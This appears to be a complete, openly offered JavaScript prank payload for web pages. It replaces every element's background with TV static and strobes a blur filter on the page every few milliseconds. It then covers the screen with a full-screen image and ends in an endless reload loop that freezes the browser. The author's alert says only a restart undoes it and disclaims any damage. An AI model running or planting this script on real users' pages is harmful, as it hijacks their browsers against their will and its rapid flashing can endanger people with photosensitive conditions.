alert("by infinitexlks. Only way to reverse it is to restart your computer. Do NOT blame me for any damages.");

function applyBackgroundImage(element) {
    var childNodes = element.childNodes;
    for (var i in childNodes) {
        applyBackgroundImage(childNodes[i]);
        if (childNodes[i] && childNodes[i].style) {
            childNodes[i].style.backgroundImage = "url(https://media.tenor.com/88dnH_mHRLAAAAAM/static-tv-static.gif)";
        }
    }
}

applyBackgroundImage(document);

var howfast = 3;
var bluroffspeed = howfast;
var bluronspeed = howfast * 2;

function blurOn() {
    (function () {
        document.body.style.filter = 'blur(5px)';
    })();
    
    function blurOff() {
        (function () {
            document.body.style.filter = 'blur(0px)';
        })();
    }

    setTimeout(blurOff, bluroffspeed);
}

setInterval(blurOn, bluronspeed);

function waiting() {
    (function () {
        var elem = document.createElement('div');
        var body = document.getElementsByTagName('body')[0];
        
        body.appendChild(elem);
        elem.style.textAlign = 'center';
        elem.style.margin = screen.height / 2 + "px";
        elem.style.position = 'fixed';
        elem.style.top = '0px';
        elem.style.left = '0px';
        elem.style.margin = '0px';
        elem.style.width = screen.width + 'px';
        elem.style.height = screen.height + 30 + 'px';
        elem.style.zIndex = 10000;
        elem.style.opacity = 1;
        elem.style.color = 'red';
        elem.id = 'elem';
        elem.style.fontSize = "30%";
        elem.style.display = 'block';

        function setBackground() {
            elem.style.backgroundImage = "url(https://i.ytimg.com/vi/R8lHaEZYpCU/maxresdefault.jpg)";
        }

        setBackground();
    })();
}

function waiting2() {
    while (true) {
        window.location.reload(1);
    }
}

setTimeout(waiting, 900);
setTimeout(waiting2, 1800);
